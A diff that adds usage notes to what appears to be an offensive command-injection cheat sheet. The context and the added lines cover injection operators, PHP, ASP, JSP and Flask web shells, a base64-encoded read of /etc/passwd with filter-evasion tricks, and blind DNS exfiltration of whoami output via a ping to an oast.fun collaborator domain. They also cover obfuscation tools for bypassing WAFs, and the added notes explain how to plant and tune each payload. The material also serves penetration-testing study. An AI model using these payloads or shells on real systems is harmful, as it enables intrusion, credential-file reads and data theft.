@@ -13,6 +13,7 @@
 ?ip=127.0.0.1||whoami                # || test (only second, if first fails)
 ?ip=127.0.0.1%0awhoami               # newline
 ```
+> Replace `ip` with the actual parameter name. Confirm injection by looking for `whoami` output (username like `www-data`) in the response. Use each operator separately — some may be blacklisted while others are not.
 
 Output behavior cheatsheet:
 | Operator | Char | URL-enc | Output |
@@ -37,18 +38,22 @@ Output behavior cheatsheet:
 <?php echo shell_exec($_GET['c']); ?>
 <?php echo `{$_GET['c']}`; ?>           // backticks
 ```
+> Four PHP web shell variants. Use `$_REQUEST` to accept both GET and POST. Switch to `passthru` or `shell_exec` if `system` is in `disable_functions`. The backtick variant is least commonly blocked.
 
 ```asp
 <% eval request('cmd') %>
 ```
+> Classic ASP web shell. Drop this in any writable `.asp` location. The `eval` function executes the value of the `cmd` parameter as VBScript.
 
 ```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
+> Java Server Pages (JSP) one-liner. Runs the command but does not return output by default — wrap in `ProcessBuilder` and read stdout if you need the result.
 
 ```python
 __import__('os').system(request.args.get('cmd'))   # Flask
 ```
+> Flask/Python shell that reads the `cmd` URL parameter and runs it as a system command. Drop into any `.py` file the Flask app will serve.
 
 ---
 
@@ -112,6 +117,7 @@ bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
 # 3. Inject after newline operator
 ?ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
 ```
+> Encodes your command as base64 to avoid blocked characters, then uses `bash<<<` (here-string) and `${IFS}` to replace pipe and space. The whole thing injects after a URL-encoded newline `%0a` which acts as a command separator.
 
 The `<<<` here-string replaces `|` pipe. `${IFS}` replaces space. `$()` subshell wraps the decode.
 
@@ -131,6 +137,7 @@ $@ $* $1 $9     # positional args — empty in interactive
 $$              # current PID
 $RANDOM         # random integer
 ```
+> Use these when specific characters are blocked. `${PATH:0:1}` reliably produces `/` on any Linux system. `${IFS}` replaces space. `$0` gives the shell name. Combine them to build blocked characters from allowed ones.
 
 ---
 
@@ -142,6 +149,7 @@ echo $(tr '!-}' '"-~'<<<[)        # [ → \
 echo $(tr '!-}' '"-~'<<<.)        # . → /
 echo $(tr '!-}' '"-~'<<<:)        # : → ;
 ```
+> Shifts each character one position up in the ASCII table. Feed the character one below what you need. Use `man ascii` to find the right input character. Works when you need a character that is blocked but its predecessor is not.
 
 ASCII reference: `man ascii` — find char N, use N-1 as input.
 
@@ -167,11 +175,13 @@ $(if [ $(whoami) = root ]; then sleep 5; fi)   # exfil bit by bit
 # Write to file then read
 whoami>/tmp/x; cat /tmp/x
 ```
+> DNS ping exfil is the most reliable blind method — UDP DNS queries bypass most egress filters. HTTP exfil requires outbound HTTP. Time-based (`sleep`) confirms injection without any outbound access. File-write works when the output is readable via another request.
 
 For DNS exfil with Burp Collaborator or interactsh:
 ```bash
 ping -c 1 $(whoami).abc123.oast.fun
 ```
+> Sends a DNS lookup with the command output embedded in the subdomain. Replace `abc123.oast.fun` with your Burp Collaborator or interactsh payload domain. The lookup appears in your collaborator log if injection succeeded.
 
 ---
 
@@ -186,6 +196,7 @@ git clone https://github.com/Bashfuscator/Bashfuscator
 git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
 pwsh -c 'Import-Module ./Invoke-DOSfuscation.psd1; Invoke-DOSfuscation'
 ```
+> Bashfuscator generates obfuscated bash commands to bypass WAFs and filters. `-s 1 -t 1` sets speed and time to minimum so the output is shorter. Invoke-DOSfuscation does the same for Windows CMD payloads.
 
 ---
 
